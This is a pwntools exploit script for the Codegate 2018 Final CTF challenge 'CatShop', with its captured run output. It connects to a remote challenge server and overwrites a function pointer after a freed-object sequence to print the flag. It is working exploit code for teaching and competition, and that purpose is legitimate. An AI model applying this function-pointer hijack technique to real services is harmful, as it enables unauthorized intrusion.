from pwn import *

context.arch = "i386"
# context.log_level = "DEBUG"


isRemote = True

e = ELF("./catshop")
if isRemote:
    p = remote("211.117.60.76", 8888)
else:
    p = process("./catshop")

p.sendafter("your choice:\n", p32(1))
p.sendafter("your choice:\n", p32(2))
p.sendafter("your choice:\n", p32(4))

p.sendafter("Your Name Length :\n", p32(0x8))
p.sendafter("Your Name :\n", p32(0x080488B6) + p32(0))

p.sendafter("your choice:\n", p32(3))

p.interactive()

'''
shgroup@ubuntu:~/Desktop/codegate/pwnable/CatShop$ python solve.py 
[*] '/mnt/hgfs/Writeup/ctf/codegate/2018-Final/pwnable/CatShop/catshop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 211.117.60.76 on port 8888: Done
[*] Switching to interactive mode
I_l1k3_Cut3_Cat_Dont_y0u?
----------------------------------------------------------
1. Buy cat
2. Sell cat
3. Mew
4. Your name change
5. Your name print
6. Exit
----------------------------------------------------------
your choice:
$ 
[*] Interrupted
[*] Closed connection to 211.117.60.76 port 8888
'''